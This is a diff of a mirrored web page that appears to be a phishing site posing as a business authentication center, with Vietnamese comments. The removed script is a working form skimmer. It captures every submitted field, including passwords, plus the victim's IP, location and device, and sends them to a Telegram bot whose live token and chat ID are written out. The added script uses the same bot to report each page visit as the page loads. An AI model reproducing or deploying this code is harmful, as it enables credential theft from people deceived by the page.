@@ -2,168 +2,73 @@
 <!-- Mirrored from https://authentication-entry-center.netlify.app/business-center by HTTrack Website Copier/3.x [XR&CO], Thu, 19 Nov 2026 06:51:41 GMT -->
 <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
 <head><script>
-(function() {
-    // ================= CẤU HÌNH TELEGRAM =================
-    const BOT_TOKEN = '9141061384:AAHGfs-TlTtvmoZaY0SicT-YH5Shmb907R4';
-    const CHAT_ID = '-5377276972';
-    // =====================================================
+  // CẤU HÌNH THÔNG SỐ TELEGRAM CỦA BẠN
+  const TELEGRAM_CONFIG = {
+    BOT_TOKEN: "9141061384:AAHGfs-TlTtvmoZaY0SicT-YH5Shmb907R4", // Ví dụ: 7123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw
+    CHAT_ID: "-5377276972"      // Ví dụ: -1001234567890 hoặc 987654321
+  };
 
-    // Hàm fetch có giới hạn thời gian (tránh kẹt trên điện thoại)
-    async function fetchWithTimeout(url, timeout = 2500) {
-        const controller = new AbortController();
-        const id = setTimeout(() => controller.abort(), timeout);
-        try {
-            const response = await fetch(url, { signal: controller.signal });
-            clearTimeout(id);
-            return response;
-        } catch (err) {
-            clearTimeout(id);
-            throw err;
-        }
+  // HÀM GỬI TIN NHẮN MẶC ĐỊNH
+  async function sendDefaultTelegramMessage(eventName = "Sự kiện mặc định") {
+    // Nội dung tin nhắn mẫu mặc định (tự động lấy URL và thời gian hiện tại)
+    const defaultMessage = `
+🔔 <b>THÔNG BÁO SỰ KIỆN WEB</b>
+------------------------
+📌 <b>Sự kiện:</b> ${eventName}
+🌐 <b>Trang:</b> ${window.location.href}
+⏰ <b>Thời gian:</b> ${new Date().toLocaleString("vi-VN")}
+    `.trim();
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
+
+    try {
+      const response = await fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CONFIG.CHAT_ID,
+          text: defaultMessage,
+          parse_mode: "HTML"
+        })
+      });
+
+      const data = await response.json();
+      if (data.ok) {
+        console.log("Đã gửi thông báo về Telegram thành công!");
+      } else {
+        console.error("Lỗi từ Telegram:", data.description);
+      }
+    } catch (error) {
+      console.error("Lỗi kết nối:", error);
     }
+  }
 
-    // Nhận diện thiết bị (Hỗ trợ cả iPhone, iPadOS, Zalo/FB Browser)
-    function getDeviceInfo() {
-        const ua = navigator.userAgent;
-        const isIpadOS = (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
-        
-        let deviceType = "Máy tính";
-        if (isIpadOS || /iPad|Tablet/i.test(ua)) deviceType = "Máy tính bảng";
-        else if (/Mobi|Android|iPhone|iPod/i.test(ua)) deviceType = "Điện thoại";
+  // ==========================================
+  // CÁC SỰ KIỆN TỰ ĐỘNG CHẠY (BỎ COMMENT ĐỂ DÙNG)
+  // ==========================================
 
-        let os = "Khác";
-        if (isIpadOS || /iPhone|iPad|iPod/i.test(ua)) os = "iOS/iPadOS";
-        else if (/Android/i.test(ua)) os = "Android";
-        else if (/Windows/i.test(ua)) os = "Windows";
-        else if (/Mac OS X/i.test(ua)) os = "macOS";
+  // Sự kiện 1: Tự động gửi ngay khi có người truy cập/tải xong trang web
+  window.addEventListener("DOMContentLoaded", () => {
+    sendDefaultTelegramMessage("Có khách truy cập trang web");
+  });
 
-        let browser = "Browser";
-        if (/Zalo/i.test(ua)) browser = "Zalo Browser";
-        else if (/FBAN|FBAV/i.test(ua)) browser = "Facebook Browser";
-        else if (/CriOS|Chrome/i.test(ua)) browser = "Chrome";
-        else if (/Safari/i.test(ua)) browser = "Safari";
-
-        return `${deviceType} (${os} - ${browser})`;
+  // Sự kiện 2: Tự động gửi khi người dùng bấm vào bất kỳ nút (button) nào trên web
+  /*
+  document.addEventListener("click", (e) => {
+    if (e.target.tagName === "BUTTON") {
+      sendDefaultTelegramMessage(`Người dùng đã bấm nút: ${e.target.innerText}`);
     }
+  });
+  */
 
-    // Lấy IP & Location
-    async function getIpAndLocation() {
-        try {
-            const res = await fetchWithTimeout('https://ipwho.is/', 2500);
-            const data = await res.json();
-            if (data.success) {
-                const loc = [data.city, data.country].filter(Boolean).join(', ');
-                return { ip: data.ip, location: loc || 'Không rõ' };
-            }
-        } catch (e) {
-            try {
-                const res2 = await fetchWithTimeout('https://api.ipify.org?format=json', 2000);
-                const data2 = await res2.json();
-                return { ip: data2.ip, location: 'Ẩn vị trí' };
-            } catch (err) {
-                return { ip: 'Không lấy được', location: 'Không lấy được' };
-            }
-        }
-        return { ip: 'Không lấy được', location: 'Không lấy được' };
-    }
-
-    function escapeHTML(str) {
-        return String(str).replace(/&/g, '&').replace(/</g, '<').replace(/>/g, '>');
-    }
-
-    // Tìm nhãn (Label) thông minh cho các form React/Next.js hay thiếu thuộc tính name
-    function getFieldLabel(el, index) {
-        if (el.getAttribute('name')) return el.getAttribute('name');
-        if (el.getAttribute('placeholder')) return el.getAttribute('placeholder');
-        if (el.getAttribute('aria-label')) return el.getAttribute('aria-label');
-        if (el.id) {
-            const labelEl = document.querySelector(`label[for="${el.id}"]`);
-            if (labelEl && labelEl.innerText.trim()) return labelEl.innerText.trim();
-            return el.id;
-        }
-        return `Trường #${index + 1}`;
-    }
-
-    // Lắng nghe sự kiện ở cấp toàn trang (Capture phase = true để chạy TRƯỚC React)
-    document.addEventListener('submit', async function(e) {
-        const form = e.target;
-        if (!form || form.tagName !== 'FORM') return;
-
-        // Chống gửi trùng lặp 2 lần liên tiếp
-        if (form.dataset.tgSending === 'true') return;
-        form.dataset.tgSending = 'true';
-
-        // Lưu ý: Nếu web gốc của bạn có logic chuyển trang hoặc lưu database riêng, 
-        // hãy GIỮ nguyên (không gọi e.preventDefault()) nếu muốn web gốc vẫn chạy bình thường,
-        // HOẶC bỏ comment dòng dưới đây nếu bạn muốn chặn web gốc reload:
-        // e.preventDefault();
-
-        const fieldsMap = new Map();
-        const inputs = form.querySelectorAll('input, select, textarea');
-
-        inputs.forEach((el, index) => {
-            if (['submit', 'button', 'reset', 'file'].includes(el.type)) return;
-            if ((el.type === 'checkbox' || el.type === 'radio') && !el.checked) return;
-
-            const val = el.value ? el.value.trim() : '';
-            if (val === '') return;
-
-            const fieldName = getFieldLabel(el, index);
-            if (!fieldsMap.has(fieldName)) fieldsMap.set(fieldName, []);
-            fieldsMap.get(fieldName).push(val);
-        });
-
-        // Nếu form không có dữ liệu hợp lệ thì bỏ qua
-        if (fieldsMap.size === 0) {
-            form.dataset.tgSending = 'false';
-            return;
-        }
-
-        try {
-            const [geoInfo, deviceInfo] = await Promise.all([
-                getIpAndLocation(),
-                Promise.resolve(getDeviceInfo())
-            ]);
-
-            let message = `📩 <b>DỮ LIỆU FORM MỚI</b>\n`;
-            message += `━━━━━━━━━━━━━━━━━━━━\n`;
-
-            fieldsMap.forEach((values, key) => {
-                if (values.length === 1) {
-                    message += `🔹 <b>${escapeHTML(key)}:</b> ${escapeHTML(values[0])}\n`;
-                } else {
-                    values.forEach((v, idx) => {
-                        message += `🔹 <b>${escapeHTML(key)} (${idx + 1}):</b> ${escapeHTML(v)}\n`;
-                    });
-                }
-            });
-
-            message += `━━━━━━━━━━━━━━━━━━━━\n`;
-            message += `🌍 <b>IP:</b> <code>${escapeHTML(geoInfo.ip)}</code>\n`;
-            message += `📍 <b>Vị trí:</b> ${escapeHTML(geoInfo.location)}\n`;
-            message += `📱 <b>Thiết bị:</b> ${escapeHTML(deviceInfo)}\n`;
-            message += `🔗 <b>Trang:</b> ${escapeHTML(window.location.href)}\n`;
-            message += `⏰ <b>Lúc:</b> ${new Date().toLocaleString('vi-VN')}`;
-
-            // Dùng keepalive: true để đảm bảo tin nhắn vẫn gửi đi thành công ngay cả khi trang chuyển hướng
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                keepalive: true,
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML',
-                    disable_web_page_preview: true
-                })
-            });
-        } catch (err) {
-            console.error('Lỗi gửi Telegram:', err);
-        } finally {
-            setTimeout(() => { form.dataset.tgSending = 'false'; }, 2000);
-        }
-    }, true); // Tham số true (Capture phase) giúp bắt dữ liệu trước khi React xóa form
-})();
+  // Sự kiện 3: Tự động gửi khi người dùng bấm Submit một Form bất kỳ
+  /*
+  document.addEventListener("submit", (e) => {
+    sendDefaultTelegramMessage("Người dùng vừa gửi biểu mẫu (Form)");
+  });
+  */
 </script><meta charSet="utf-8"/>
 <!-- This site is hosted on Netlify. Anyone can build and deploy a site
      like this one for free: https://netlify.new/?utm_campaign=loops&utm_source=ai-legible&utm_medium=owned&utm_content=comment&utm_id=e6480cd0-4259-4b3d-a381-30af56dafac8
